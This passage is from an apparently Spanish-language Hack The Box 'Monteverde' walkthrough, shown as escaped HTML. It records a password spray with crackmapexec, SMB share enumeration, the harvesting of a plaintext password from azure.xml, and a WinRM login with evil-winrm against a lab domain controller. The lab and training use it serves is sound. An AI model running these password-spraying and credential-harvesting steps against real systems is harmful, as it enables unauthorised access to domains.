&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] User svc-netapp doesn&lt;span class=&quot;s1&quot;&gt;&apos;t have UF_DONT_REQUIRE_PREAUTH set
[-] User dgalanos doesn&apos;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] User roleary doesn&lt;span class=&quot;s1&quot;&gt;&apos;t have UF_DONT_REQUIRE_PREAUTH set
[-] User smorgan doesn&apos;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Clients credentials have been revoked&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] User AAD_987d7f2f57d2 doesn&lt;span class=&quot;s1&quot;&gt;&apos;t have UF_DONT_REQUIRE_PREAUTH set
[-] User mhope doesn&apos;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] User SABatchJobs doesn&lt;span class=&quot;s1&quot;&gt;&apos;t have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-ata doesn&apos;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] User svc-bexec doesn&lt;span class=&quot;s1&quot;&gt;&apos;t have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-netapp doesn&apos;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] User dgalanos doesn&lt;span class=&quot;s1&quot;&gt;&apos;t have UF_DONT_REQUIRE_PREAUTH set
[-] User roleary doesn&apos;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] User smorgan doesn&lt;span class=&quot;s1&quot;&gt;&apos;t have UF_DONT_REQUIRE_PREAUTH set

No funciona
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Probamos a Realizar un ataque de Password Spray con Crackmapexec usando porque no como PASSWORDS el mismo listado de Users&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# crackmapexec smb 10.10.10.172 -u users.txt -p users.txt   &lt;/span&gt;
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:MONTEVERDE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:MEGABANK.LOCAL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:roleary STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:smorgan STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:roleary STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:smorgan STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ABatchJobs:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE     &lt;span class=&quot;s2&quot;&gt;&quot;  [+] MEGABANK.LOCAL&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ABatchJobs:SABatchJobs    &quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Probamos a listar recursos compartidos por SMB para este usuario&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# smbmap -H 10.10.10.172 -u &apos;SABatchJobs&apos; -p &apos;SABatchJobs&apos;     &lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.10.172:445        Name: MEGABANK.LOCAL                                    
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        ADMIN&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                 NO ACCESS       Remote Admin
        azure_uploads                                           READ ONLY
        C&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                     NO ACCESS       Default share
        E&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                     NO ACCESS       Default share
        IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                   READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                 READ ONLY
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# smbmap -H 10.10.10.172 -u &apos;SABatchJobs&apos; -p &apos;SABatchJobs&apos; -r &apos;azure_uploads&apos; &lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.10.172:445        Name: MEGABANK.LOCAL                                    
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        azure_uploads                                           READ ONLY
        .&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;zure_uploads&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;
        dr--r--r--                0 Fri Jan  3 13:43:36 2020    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
        dr--r--r--                0 Fri Jan  3 13:43:36 2020    ..
        
&lt;span class=&quot;c&quot;&gt;# smbmap -H 10.10.10.172 -u &apos;SABatchJobs&apos; -p &apos;SABatchJobs&apos; -r &apos;IPC$&apos;                                                                                                                                         1 ⚙&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.10.172:445        Name: MEGABANK.LOCAL                                    
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                   READ ONLY
        .&lt;span class=&quot;se&quot;&gt;\I&lt;/span&gt;PC&lt;span class=&quot;nv&quot;&gt;$\&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    InitShutdown
        fr--r--r--                4 Sun Dec 31 23:45:16 1600    lsass
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    ntsvcs
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    scerpc
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;atalogChangeListener-378-0
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    epmapper
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;atalogChangeListener-1d4-0
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    LSM_API_service
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    eventlog
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;atalogChangeListener-47c-0
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    atsvc
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;atalogChangeListener-62c-0
        fr--r--r--                4 Sun Dec 31 23:45:16 1600    wkssvc
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;atalogChangeListener-26c-0
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;atalogChangeListener-26c-1
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    RpcProxy&lt;span class=&quot;se&quot;&gt;\4&lt;/span&gt;9673
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    f9f9dd07a1a076b9
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    RpcProxy&lt;span class=&quot;se&quot;&gt;\5&lt;/span&gt;93
        fr--r--r--                4 Sun Dec 31 23:45:16 1600    srvsvc
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    spoolss
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;atalogChangeListener-abc-0
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    netdfs
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    vgauth-service
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;atalogChangeListener-264-0
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    SQLLocal&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;SSQLSERVER
        fr--r--r--                2 Sun Dec 31 23:45:16 1600    sql&lt;span class=&quot;se&quot;&gt;\q&lt;/span&gt;uery
        fr--r--r--                3 Sun Dec 31 23:45:16 1600    W32TIME_ALT
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;atalogChangeListener-b24-0
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    PIPE_EVENTROOT&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;IMV2SCM EVENT PROVIDER
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    CPFATP_3900_v4.0.30319
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    PSHost.132956289328053743.3900.DefaultAppDomain.miiserver
        fr--r--r--                1 Sun Dec 31 23:45:16 1600    Winsock2&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;atalogChangeListener-b14-0
        
&lt;span class=&quot;c&quot;&gt;# smbmap -H 10.10.10.172 -u &apos;SABatchJobs&apos; -p &apos;SABatchJobs&apos; -r &apos;users$&apos;                                        &lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.10.172:445        Name: MEGABANK.LOCAL                                    
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                 READ ONLY
        .&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;sers&lt;span class=&quot;nv&quot;&gt;$\&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
        dr--r--r--                0 Fri Jan  3 14:12:48 2020    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
        dr--r--r--                0 Fri Jan  3 14:12:48 2020    ..
        dr--r--r--                0 Fri Jan  3 14:15:23 2020    dgalanos
        dr--r--r--                0 Fri Jan  3 14:41:18 2020    mhope
        dr--r--r--                0 Fri Jan  3 14:14:56 2020    roleary
        dr--r--r--                0 Fri Jan  3 14:14:28 2020    smorgan

&lt;span class=&quot;c&quot;&gt;# smbmap -H 10.10.10.172 -u &apos;SABatchJobs&apos; -p &apos;SABatchJobs&apos; -r &apos;SYSVOL&apos;                                             &lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.10.172:445        Name: MEGABANK.LOCAL                                    
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        SYSVOL                                                  READ ONLY
        .&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;YSVOL&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;
        dr--r--r--                0 Thu Jan  2 23:05:27 2020    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
        dr--r--r--                0 Thu Jan  2 23:05:27 2020    ..
        dr--r--r--                0 Thu Jan  2 23:05:27 2020    MEGABANK.LOCAL
        
&lt;span class=&quot;c&quot;&gt;# smbmap -H 10.10.10.172 -u &apos;SABatchJobs&apos; -p &apos;SABatchJobs&apos; -r &apos;NETLOGON&apos;                                      &lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.10.172:445        Name: MEGABANK.LOCAL                                    
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        NETLOGON                                                READ ONLY
        .&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;ETLOGON&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;
        dr--r--r--                0 Thu Jan  2 23:05:27 2020    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
        dr--r--r--                0 Thu Jan  2 23:05:27 2020    ..
        
&lt;span class=&quot;c&quot;&gt;# smbmap -H 10.10.10.172 -u &apos;SABatchJobs&apos; -p &apos;SABatchJobs&apos; -r &apos;users$/mhope&apos;                         &lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.10.172:445        Name: MEGABANK.LOCAL                                    
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                 READ ONLY
        .&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;sers&lt;span class=&quot;nv&quot;&gt;$mhope&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;
        dr--r--r--                0 Fri Jan  3 14:41:18 2020    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
        dr--r--r--                0 Fri Jan  3 14:41:18 2020    ..
        fw--w--w--             1212 Fri Jan  3 15:59:24 2020    azure.xml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Descargamos el archivo interesante a nuestro pc&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# smbmap -H 10.10.10.172 -u &apos;SABatchJobs&apos; -p &apos;SABatchJobs&apos; --download &apos;users$/mhope/azure.xml&apos;   &lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Starting download: &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$\&lt;/span&gt;mhope&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;zure.xml &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1212 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                                                                         
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] File output to: /home/pro/Escritorio/HTB/Monteverde/nmap/10.10.10.172-users_mhope_azure.xml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Lo leemos&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# cat mhope-azure.xml                                                                                                                                                                                        1 ⚙ &lt;/span&gt;
&amp;lt;Objs &lt;span class=&quot;nv&quot;&gt;Version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.1.0.1&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;xmlns&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                                                                   
  &amp;lt;Obj &lt;span class=&quot;nv&quot;&gt;RefId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
    &amp;lt;TN &lt;span class=&quot;nv&quot;&gt;RefId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
      &amp;lt;T&amp;gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&amp;lt;/T&amp;gt;
      &amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt;
    &amp;lt;/TN&amp;gt;
    &amp;lt;ToString&amp;gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&amp;lt;/ToString&amp;gt;
    &amp;lt;Props&amp;gt;
      &amp;lt;DT &lt;span class=&quot;nv&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;StartDate&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;2020-01-03T05:35:00.7562298-08:00&amp;lt;/DT&amp;gt;
      &amp;lt;DT &lt;span class=&quot;nv&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;EndDate&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;2054-01-03T05:35:00.7562298-08:00&amp;lt;/DT&amp;gt;
      &amp;lt;G &lt;span class=&quot;nv&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;KeyId&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;00000000-0000-0000-0000-000000000000&amp;lt;/G&amp;gt;
      &amp;lt;S &lt;span class=&quot;nv&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Password&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;4n0therD4y@n0th3r&lt;span class=&quot;nv&quot;&gt;$&amp;lt;&lt;/span&gt;/S&amp;gt;
    &amp;lt;/Props&amp;gt;
  &amp;lt;/Obj&amp;gt;
&amp;lt;/Objs&amp;gt;    
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Encontramos una credenciales para mhope&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crackmapexec smb 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; mhope &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;4n0therD4y@n0th3r$&apos;&lt;/span&gt;                                                                                                                                             1 ⚙
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:MONTEVERDE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:MEGABANK.LOCAL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         10.10.10.172    445    MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:4n0therD4y@n0th3r&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;

┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root💀pro&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[/home/…/Escritorio/HTB/Monteverde/nmap]
└─# crackmapexec winrm 10.10.10.172 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; mhope &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;4n0therD4y@n0th3r$&apos;&lt;/span&gt;                                                                                                                                           1 ⚙
WINRM       10.10.10.172    5985   MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:MONTEVERDE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:MEGABANK.LOCAL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
WINRM       10.10.10.172    5985   MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; http://10.10.10.172:5985/wsman
WINRM       10.10.10.172    5985   MONTEVERDE       &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] MEGABANK.LOCAL&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;hope:4n0therD4y@n0th3r&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Pwn3d!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# evil-winrm -i 10.10.10.172 -u mhope -p &apos;4n0therD4y@n0th3r$&apos;                                                                                                                                          130 ⨯ 1 ⚙&lt;/span&gt;

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

